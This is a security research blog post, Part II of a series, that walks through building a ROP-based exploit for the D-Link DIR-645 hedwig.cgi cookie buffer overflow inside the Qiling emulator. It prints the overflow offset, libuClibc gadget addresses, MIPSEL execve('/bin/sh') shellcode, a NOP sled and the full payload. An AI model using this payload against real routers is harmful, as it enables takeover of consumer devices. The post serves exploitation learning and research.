# Analyzing a buffer overflow in the DLINK DIR-645 with Qiling framework, Part II [![Twitter URL](https://img.shields.io/twitter/url?style=social&url=https%3A%2F%2Fgithub.com%2Fnahueldsanchez%2Fblogpost_qiling_dlink_2)](https://twitter.com/intent/tweet?text=https://github.com/nahueldsanchez/blogpost_qiling_dlink_2)



[![Twitter Follow](https://img.shields.io/twitter/follow/nahueldsanchez_?color=1DA1F2&logo=twitter&style=for-the-badge)](https://twitter.com/nahueldsanchez_?s=20) 

## Introduction

Hello everyone! Continuing with our saga of blog posts about Qiling, today we'll analyze how we can write an exploit that will be "almost" functional in Qiling and the process that I followed to do it. If you did not read my previous blog post [Analyzing a buffer overflow...with Qiling Framework,Part I](https://github.com/nahueldsanchez/blogpost_qiling_dlink_1), I encourage you to do so.

### **Contents**
1. [Writing the exploit](##Writing-the-exploit)
2. [Making system call "work"](#Making-system-call-work)
3. [Writing the exploit to make it work in Qiling](#Writing-the-exploit-to-make-it-work-in-Qiling)  
    - [Understanding how MIPS calling convention works](#Understanding-how-MIPS-calling-convention-works)
    - [Playing with ROP and finishing the exploit](#Playing-with-ROP-and-finishing-the-exploit)
4. [References](#References)





## Writing the exploit

Just to have some context, in the first part we identified the vulnerability, how to trigger it and its underlying cause. We'll continue from this point.
We know that our program will crash returning from address `0x0040c594`, that is, function `hedwig_main`:

```
...
0040c58c c4 04 b1 8f     lw         s1,param_12(sp)
0040c590 c0 04 b0 8f     lw         s0,param_11(sp)
0040c594 08 00 e0 03     jr         ra
...
```

We also know that we are overwriting a lot of memory in the stack and we control a good number of registers:

```
...
[-] s0	:	 0x41414141
[-] s1	:	 0x41414141
[-] s2	:	 0x41414141
[-] s3	:	 0x41414141
[-] s4	:	 0x41414141
[-] s5	:	 0x41414141
[-] s6	:	 0x41414141
[-] s7	:	 0x41414141
[-] t8	:	 0x8
[-] t9	:	 0x0
[-] k0	:	 0x0
[-] k1	:	 0x0
[-] gp	:	 0x43b6d0
[-] sp	:	 0x7ff3c608
[-] s8	:	 0x41414141
[-] ra	:	 0x41414141
[-] status	:	 0x0
[-] lo	:	 0x0
[-] hi	:	 0x0
[-] badvaddr	:	 0x0
[-] cause	:	 0x0
[-] pc	:	 0x41414140
...
```
Considering this scenario, my idea was to overwrite the return address with the address of `system`, previously setting up the parameters as needed. I know that this should work as the exploit included in Metasploit does the same.

To test my hypothesis, I've decided,as a first step, to get rid of all the complexities and _simulate_ the exploitation. The idea was to allocate some memory, write our command there, load the memory address in the required register and change the return address to point to `system` function. Sounds like a lot of work right? Not for Qiling, check it out:

```Python
...
RETURN_CORRUPTED_STACK = 0x0040c594     # From the previous blog post.
QILING_SYSTEM = 0x0041eb50              # This was retrieved enabling debugging
                                        # and connecting to GDB.Once at the
                                        # initial breakpoint I executed:
                                        # x/10i system to obtain system function addr

def simulate_exploitation(ql):
    ql.nprint("** at simulate_exploitation **")
    cmd = ql.mem.map_anywhere(20)       # Qiling will allocate a chunk of 20 bytes
                                        # for us and return its address. We
                                        # will write our command there
    
    ql.mem.string(command, "/bin/sh")   # We write our string
    ql.reg.a0 = command                 # We set register a0 with the address
                                        # of our command
    ql.reg.ra = QILING_SYSTEM           # and finally we change the $ra register
...

ql.hook_address(simulate_exploit, RETURN_CORRUPTED_STACK)   # We'll call our callback
                                                            # when reaching the ret
                                                            # from hedwig_main
ql.run()
```

As you can see it's pretty straightforward to simulate our exploit. Let's see what happens:

```
...
** at simulate_exploitation **
rt_sigaction(0x3, 0x7ff3c430, = 0x7ff3c450) = 0
rt_sigaction(0x2, 0x7ff3c430, = 0x7ff3c450) = 0
rt_sigaction(0x12, 0x7ff3c430, = 0x7ff3c450) = 0
[!] 0x77507144: syscall ql_syscall_fork number = 0xfa2(4002) not implemented
rt_sigaction(0x3, 0x7ff3c430, = 0x7ff3c450) = 0
rt_sigaction(0x2, 0x7ff3c430, = 0x7ff3c450) = 0
[!] Syscall ERROR: ql_syscall_wait4 DEBUG: [Errno 10] No child processes
ChildProcessError: [Errno 10] No child processes
...
```
It looks like it worked!? I think that what's happening is that we are reaching `system` function and at some point `system` is trying to use the `fork syscall`, which Qiling does not support.   
To confirm that my idea was working I did two things: First, I set a breakpoint on `system` and checked that I hit the breakpoint at some point (it happened); Second, and more interesting to show, I changed the call to `system` for `exit`. Let's see what happens:

```Python
def simulate_exploitation(ql):
    ...
    ql.reg.ra = QILING_EXIT           # and finally we change the $ra register
```

Running the PoC:

```
...
** at simulate_exploitation **
write(1,7756d038,114) = 0
HTTP/1.1 200 OK
Content-Type: text/xml

<hedwig><result>FAILED</result><message>no xml data.</message></hedwig>exit(4431872) = 4431872
...
```

Much better! As we can see the program exits gracefully with the call to `exit()`. We can be sure that the idea for the exploit works! Let's work on transforming this simulation into something real.

### Making system call "work"

While reading what I did in the previous step, I realized that I was being lazy taking the shortcut of executing `exit` as shellcode,  and that I should try harder with my first idea of calling the system function. Based on this, I dug deeper on how to make this work.

My first idea was to check why I was receiving this error:

```
[!] 0x77507144: syscall ql_syscall_fork number = 0xfa2(4002) not implemented
```


I [looked up what type of syscall]((https://syscalls.w3challs.com/?arch=mips_o32)) 0xfa2 was, and found that , _syscall 0xfa2_ is a [fork](https://man7.org/linux/man-pages/man2/fork.2.html). With this information, I used [Qiling's ability to extend syscalls](https://docs.qiling.io/en/latest/hijack/#qlset_syscall) like this:

```Python

MIPS_FORK_SYSCALL = 0xfa2

...

# Code copied from lib/qiling/os/posix/syscall/unistd.py:380
def hook_fork(ql, *args, **kw):
    pid = os.fork()
    
    if pid == 0:
        ql.os.child_processes = True
        ql.dprint (0, "[+] vfork(): is this a child process: %r" % (ql.os.child_processes))
        regreturn = 0
        if ql.os.thread_management != None:
            ql.os.thread_management.cur_thread.set_thread_log_file(ql.log_dir)
        else:
            if ql.log_split:
                _logger = ql.log_file_fd
                _logger = ql_setup_logging_file(ql.output, ql.log_file , _logger)
                _logger_name = str(len(logging.root.manager.loggerDict))
                _logger = ql_setup_logging_file(ql.output, '_'.join((ql.log_file, _logger_name)))
                ql.log_file_fd = _logger
    else:
        regreturn = pid

    if ql.os.thread_management != None:
        ql.emu_stop()

...

ql.set_syscall(MIPS_FORK_SYSCALL, hook_fork)
```

I copied the code from Qiling's fork implementation just as a test but it worked great:

```
** at simulate_exploitation **
rt_sigaction(0x3, 0x7ff3c430, = 0x7ff3c450) = 0
rt_sigaction(0x2, 0x7ff3c430, = 0x7ff3c450) = 0
rt_sigaction(0x12, 0x7ff3c430, = 0x7ff3c450) = 0
vfork() = 24076
vfork() = 0
rt_sigaction(0x3, 0x7ff3c430, = 0x7ff3c450) = 0
rt_sigaction(0x2, 0x7ff3c430, = 0x7ff3c450) = 0
rt_sigaction(0x3, 0x7ff3c430, = 0x7ff3c450) = 0
rt_sigaction(0x2, 0x7ff3c430, = 0x7ff3c450) = 0
rt_sigaction(0x12, 0x7ff3c430, = 0x7ff3c450) = 0
[!] Syscall ERROR: ql_syscall_execve DEBUG: Invalid memory read (UC_ERR_READ_UNMAPPED)
Traceback (most recent call last):
  File "emulate_cgibin.py", line 143, in <module>
```

We can see the output from our function, but more importantly, we can see the error message from `execve` syscall, which shows us that at the end `execve` was called, confirming that `system` call was executed!. To fix this error I hijacked `execve` syscall with [Qiling's magic](https://docs.qiling.io/en/latest/hijack/#on-enter-interceptor-with-qlset_syscall) and properly set up the registers to make the call work:

```Python

MIPS_EXECVE_SYSCALL = 0xfab

...

def execve_onenter(ql, pathname, argv, envp, *args):
    ql.nprint("at execve_onenter")
    ql.reg.a1 = 0
    ql.reg.a2 = 0
    ql.nprint(ql.mem.string(pathname))
    ql.nprint(ql.mem.string(argv))

...

ql.set_syscall(MIPS_EXECVE_SYSCALL, execve_onenter, QL_INTERCEPT.ENTER)

```

Output:

```
...
vfork() = 24229
vfork() = 0
rt_sigaction(0x3, 0x7ff3c430, = 0x7ff3c450) = 0
rt_sigaction(0x3, 0x7ff3c430, = 0x7ff3c450) = 0
rt_sigaction(0x2, 0x7ff3c430, = 0x7ff3c450) = 0
rt_sigaction(0x2, 0x7ff3c430, = 0x7ff3c450) = 0
rt_sigaction(0x12, 0x7ff3c430, = 0x7ff3c450) = 0
at execve_onenter
/bin/sh
PdUwTdUw
execve(/bin/sh, [], [])
ioctl(0x0, 0x540d, 0x7ff3c5b0) = -1
ioctl(0x1, 0x540d, 0x7ff3c5b0) = -1
[!] Emulation Error
...
```

YES! We can see the output of the `execve` syscall with our command. Now we have to make this work without faking it.

Coming back to our main topic, let's do a quick recap on where the code was vulnerable:

We have our `hedgiwcgi_main` function, and thanks to Ghidra we can decompile the code. I just copied the interesting part:

```C
...
sess_get_uid(iVar1);
uVar2 = sobj_get_string(iVar1);
sprintf(acStack1064,"%s/%s/postxml","/runtime/session",uVar2);
...
```
First, the code processes our requests and obtains the UID, and later the UID is used in the `sprintf` statement to build a path that's stored in the stack. As we control the UID we can overwrite the stack and end up overwriting the saved return address. Ghidra helps us a bit telling us what type  `acStack1064` is, if you check the decompiled code for `hedwigcgi_main` you'll find at the beginning:

```C
char acStack1064 [1024];
```
We know that we'll need at least 1024 bytes to fill up this variable, plus X bytes more until we can overwrite the saved return address. There are several ways to calculate this:
+ You can use a cyclic pattern and check what pattern overwrites $ra. 
+ Another option is to check when the return address is restored at address `0x0040c568` and there we can see from which memory address is being read:

```
...
0040c568 e4 04 bf 8f     lw         ra,param_20(sp) -> Stack[0x4e4]
...
```
We can use this information along with GDB, and set a breakpoint just before and after the call to `sprintf` and do the math:

- We know our destination buffer is located at 0x7ff3c1e0
- We know that our saved return address is located at 0x7ff3c604 ($sp+0x4e4)
- If we do 0x7ff3c604-0x7ff3c1e0 = 1060 bytes, but we have to account for the fixed string. That's len(/runtime/session/) -> 17

This gives us a grand total of 1043 bytes. Let's test this. We'll put 1043 "A" and overwrite our return address with "BBBB". I set a breakpoint after the instruction that restores the $ra register before returning to it:

```Python
...
buffer = "uid=%s" % ("A" * 1043)
buffer += "BBBB"

required_env = {
    "REQUEST_METHOD": "POST",
    "HTTP_COOKIE"   : buffer
}

ql = Qiling(path, rootfs, output = "none", env=required_env)
...
```

Output:

```
...
   0x40c568 <hedwigcgi_main+1448> lw     ra, 1252(sp)
→  0x40c56c <hedwigcgi_main+1452> move   v0, s7
...
Breakpoint 1, 0x0040c568 in hedwigcgi_main ()
...
$pc  : 0x0040c56c
$sp  : 0x7ff3c4e8
$hi  : 0x0       
$lo  : 0x0       
$fir : 0x0       
$ra  : 0x42424242 ("BBBB"?)
...
```

It worked! We already know that we have 1043 bytes to overwrite the return address, let's try to use this to do something useful. My idea was to use part of our 1043 bytes buffer to place  our shellcode to call `execve("/bin/sh")` and jump to it. I assumed that the code in the stack is executable (no NX bit); I think that this is a safe assumption based on what I read about these cheap routers, also the exploit in [Metasploit](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/linux/http/dlink_hedwig_cgi_bof.rb) does this.


### Writing the exploit to make it work in Qiling

With the above problems solved I proceeded to work on writing an exploit that could run in the Qiling emulated environment. The goals behind this were:

- Learn more about MIPS exploitation (before writing this blog post, I knew zero)
- Keep learning about Qiling
- Have fun...?

It turns out that it took me quite some time to make this work, but I found tremendous value doing it as I learned new things and performed some really good hands-on training.

I started to work on my idea with Pedro [Ribeiro's advisory](https://raw.githubusercontent.com/pedrib/PoC/master/advisories/dlink-hnap-login.txt) for a different CVE with similar characteristics. The plan I had in mind was:



1) Exploit the vulnerability and overwrite the return address
2) Once having control over the program's flow,redirect execution and execute Sleep to simulate what you have to do on MIPS to have a reliable exploit and deal with cache incoherency
3) Find my shellcode in the stack
4) Redirect execution to it


#### Understanding how MIPS calling convention works

Having already completed step one, I decided to do what I thought was a quick test: Directly overwrite the return address with the address of the `sleep` function, and set the required parameters simulating the exploitation:

To find the address of sleep, I thought that it was enough with doing: `info functions <function name>`, but this will return the address of the function mapped in the `cgi-bin` binary and no the real address from the `libuClibc.so` library.

To find the correct address I followed these steps:

1) I checked at what address the `libuClibc` was being loaded with these lines of code:

```Python
def simulate_exploit(ql):
    import pdb
    pdb.set_trace()
    ...
```

Once I ran the program and landed in the Python shell provided by PDB, I used `
ql.mem.show_mapinfo()` and got:

```
...
[+] 774fc000 - 7755a000 - rwx    [mmap] ../lib/libuClibc-0.9.30.1.so
[+] 7755a000 - 77569000 - rwx    [syscall_mmap]
[+] 77569000 - 7756b000 - rwx    [mmap] ../libuClibc-0.9.30.1.so
...
```

Now we know that our library is being loaded at `0x774fc000`

2) I opened the `libuClibc-0.9.30.1.so` with Ghidra and looked for `sleep` function offset:

```
uint __stdcall sleep(uint __seconds)

00066bd0 02 00 1c 3c            lui        gp,0x2
...
```
I got offset `0x00066bd0`. Then I concluded that doing base address + offset I was going to be fine; however, after trial and error and checking other function addresses with GDB I found out that I needed to subtract 0x10000. So, I up came up with the following Python function:

```Python
def calc_address(addr_offset):
    LIBC_BASE = 0x774fc000

    return LIBC_BASE + addr_offset - 0x10000
```

 This sleep address, in this particular lib, will be located at `0x77552bd0`. Once having this address, I tried to use it to overwrite $RA register simulating exploitation:

```Python
def simulate_exploit(ql):
    
    ql.nprint("** at simulate_exploitation **")

    ql.reg.a0 = 1           # Seconds to sleep
    ql.reg.ra = 0x77552bd0  # sleep uClibc
    ...
```

**This attempt failed miserably** and got me stuck for a couple of days, until I found these blog posts:

- [Firmware Exploitation with JEB: Part 1](https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-1/ )
- [MIPS ROP by haskal](https://www.lorem.club/~/Haskal@write.lain.faith/mips-rop)

Both articles explain among other things (I'm super summarizing them) that due to how MIPS works you can't only overwrite `$ra` as `$t9`, and the `$gp` registers are used as well to calculate stuff once a function is called. So, you need the address of the function called in `$t9`.

With this information I slightly modified the function above to change `$t9` register and this time the test worked flawlessly:

```
...
ioctl(0x3, 0x540d, 0x7ff3c358) = -1
** at simulate_exploitation **
rt_sigprocmask(0x1, 0x7ff3c778, 0x7ff3c7f8, 0x10) = 0
nanosleep(0x7ff3c770, 0x7ff3c770) = 0 <--- Sleep is executed
...
```

#### Playing with ROP and finishing the exploit

Once I got the test working, I decided to explore how it was possible to build what I think is a reliable exploit. To do so, I've tried to avoid fixing addresses other than the ones from the `uClibc` and use ROP.

To be able to do that I needed different ROP gadgets that would perform the steps previously mentioned. To find them I performed some (slowly and painfull) manual work and complemented it with [devtty0's Ghidra scripts helper](https://github.com/tacnetsol/ghidra_scripts/).

>_Note: I had some issues with these scripts like false negatives or gadgets that did not work. Because of that I had to complement the work with some manual search._

To be able to put my shellcode in the environment variable `HTTP_COOKIE` I had to slightly modify Qiling's code to accept `bytes` as well as `strings`:

>_Note: The code was already there, I had to uncomment it._


- [Qiling's copy_str](https://github.com/qilingframework/qiling/blob/master/qiling/loader/elf.py#L123) function: 

```Python
def copy_str(self, addr, l):
    l_addr = []
    s_addr = addr
    for i in l:
        s_addr = s_addr - len(i) - 1
        if isinstance(i, bytes):
            self.ql.mem.write(s_addr, i + b'\x00')
        else:
            self.ql.mem.write(s_addr, i.encode() + b'\x00')
        l_addr.append(s_addr)
    return l_addr, s_addr
```

The first gadget that I needed was one to execute `sleep()` while having a reasonably small value in `$a0` that will serve as argument in seconds to sleep. Also, this gadget had to allow me to maintain control of the execution flow. I found the following one:

>_Note: All the gadgets were found in the libuClibc-0.9.30.1.so_

```asm
#Gadget 1 (calls sleep(3) and jumps to  $s5)
#
# 0003bc94 03 00 04 24            li         a0,0x3  ; Argument for sleep
# 0003bc98 21 c8 c0 03            move       t9,s8   ; s8 points to sleep()
# 0003bc9c 09 f8 20 03            jalr       t9
# 0003bca0 21 30 00 00            _clear     a2
# 0003bca4 21 28 80 02            move       a1,s4
# 0003bca8 0e 00 04 24            li         a0,0xe
# 0003bcac 21 c8 a0 02            move       t9,s5   ; Address of Gadget #2
# 0003bcb0 09 f8 20 03            jalr       t9
# 0003bcb4 21 30 00 00            _clear     a2
```

The second one (which address has to be in `$s5`) had to adjust the stack pointer `$sp` to land in my shellcode and put its value in a register:

```asm
# Gadget 2 (Adjusts $sp and puts stack addess in $s1)
#
# 0004dcb4 28 00 b1 27            addiu      s1,sp,0x28
# 0004dcb8 21 20 60 02            move       a0,s3
# 0004dcbc 21 28 20 02            move       a1,s1
# 0004dcc0 21 c8 00 02            move       t9,s0
# 0004dcc4 09 f8 20 03            jalr       t9
# 0004dcc8 01 00 06 24            _li        __name,0x1
```

After this gadget was executed I had register `$s1` pointing to my code in the stack and could control the execution flow controlling the value of `$s0` register. Luckily, if you remember from the beginning of the blog post we have control over it. Our last gadget then had to execute code referenced by `$t9`:

```
# Gadget 3 (jumps to $s1 -> Stack)
# 0001bb44 21 c8 20 02            move       t9,s1
# 0001bb48 09 f8 20 03            jalr       t9
# 0001bb4c 03 00 04 24            _li        __size,0x3
```

Once I had the required gadgets, I looked for a shellcode to execute `execve(/bin/sh)`. I found one that worked in the [Firmware exploitation with JEB: Part 2blogpost](https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-2/):

```Python
# execve shellcode translated from MIPS to MIPSEL
# http://shell-storm.org/shellcode/files/shellcode-792.php
# Taken from: https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-2/

shellcode = b""
shellcode += b"\xff\xff\x06\x28" # slti $a2, $zero, -1
shellcode += b"\x62\x69\x0f\x3c" # lui $t7, 0x6962
shellcode += b"\x2f\x2f\xef\x35" # ori $t7, $t7, 0x2f2f
shellcode += b"\xf4\xff\xaf\xaf" # sw $t7, -0xc($sp)
shellcode += b"\x73\x68\x0e\x3c" # lui $t6, 0x6873
shellcode += b"\x6e\x2f\xce\x35" # ori $t6, $t6, 0x2f6e
shellcode += b"\xf8\xff\xae\xaf" # sw $t6, -8($sp)
shellcode += b"\xfc\xff\xa0\xaf" # sw $zero, -4($sp)
shellcode += b"\xf4\xff\xa4\x27" # addiu $a0, $sp, -0xc
shellcode += b"\xff\xff\x05\x28" # slti $a1, $zero, -1
shellcode += b"\xab\x0f\x02\x24" # addiu;$v0, $zero, 0xfab
shellcode += b"\x0c\x01\x01\x01" # syscall 0x40404\
```

In the same blogpost a clever NOP sled is highlighted, I used it too:

```Python
# MIPS nopsled from https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-2/
buffer += b"\x26\x40\x08\x01" * 30 + shellcode
# ###########
```

Having all the pieces, the only thing that I had to do was to build the final payload with the following structure:

```Python
...
buffer = b"uid=%s" % (b"B" * 1003)
buffer += b"AAAA"
#buffer += b"0000"                                      
buffer += pack("<I", calc_address(0x0001bb44))  #Gadget #3
buffer += b"1111"                               #$s1
buffer += b"2222"                               #$s2
buffer += b"1111"                               #$s3
buffer += b"4444"                               #$s4
#buffer += b"5555"                              
buffer += pack("<I", calc_address(0x0004dcb4))  #Gadget #2
buffer += b"6666"                               #$s6
buffer += b"7777"                               #$s7
#buffer += b"8888"
buffer += pack("<I", 0x77552bd0)                # Sleep address
buffer += pack("<I", 0x77527c94)                # Overwrites $ra with #Gadget #1
buffer += b"\x26\x40\x08\x01" * 30 + shellcode
```

Taking a look at the output:

```
...
** At [sess_get_uid] **
** Ret from sobj_add_string **
socket(1, 1, 0) = 3
fcntl(3, 2) = 0
connect(../squashfs-root/var/run/xmldb_sock) = -1
close(3) = 0
open(/var/tmp/temp.xml, 0x241, 0o666) = 3
ioctl(0x3, 0x540d, 0x7ff3c358) = -1
rt_sigprocmask(0x1, 0x7ff3c778, 0x7ff3c7f8, 0x10) = 0
nanosleep(0x7ff3c770, 0x7ff3c770) = 0
execve(//bin/sh, [], [])
ioctl(0x0, 0x540d, 0x7ff3c8c8) = -1
ioctl(0x1, 0x540d, 0x7ff3c8c8) = -1
...
```

We can see: 
+ the strings printed from our previous blog 
+ the call to `nanosleep` made by the `sleep()` function 
+ (and finally) the call to `execve`.     

Job done.

If you want to reproduce this, go to [qiling_dlink_exploit.py](https://github.com/nahueldsanchez/blogpost_qiling_dlink_2/blob/master/qiling_dlink_exploit.py) to get the  Python script. I left comments to the helper functions mentioned during the blog post in case you want to play around or do some testing.   

[![Website](https://img.shields.io/website?label=nahueldsanchez&up_color=success&up_message=Blog&url=https%3A%2F%2Fnahueldsanchez.wordpress.com%2F)](https://nahueldsanchez.wordpress.com/)

# References

https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN/ - Blog post that analyzes the same vulnerability described here. It looks really interesting and provides an interesting analysis.

https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-1/ - Excellent blog post that helped me understand how to prepare the registers to make my shellcode work on MIPS. It also highlights some key differences between exploitation on X86 and MIPS.

https://www.lorem.club/~/Haskal@write.lain.faith/mips-rop - Really good explanations on MIPS exploitation

https://www.praetorian.com/blog/getting-started-with-damn-vulnerable-router-firmware-dvrf-v01 - Interesting project to keep practicing MIPS exploitation

http://www.devttys0.com/2013/10/mips-rop-ida-plugin/ - MIPS rop plugin (IDA)

https://raw.githubusercontent.com/pedrib/PoC/master/advisories/dlink-hnap-login.txt - Pedro Ribeiro Advisory for Multiple vulnerabilities in Dlink DIR routers HNAP Login function

https://gsec.hitb.org/materials/sg2015/whitepapers/Lyon%20Yang%20-%20Advanced%20SOHO%20Router%20Exploitation.pdf - EXPLOITING BUFFER OVERFLOWS ON MIPS ARCHITECTURES BY Lyon Yang
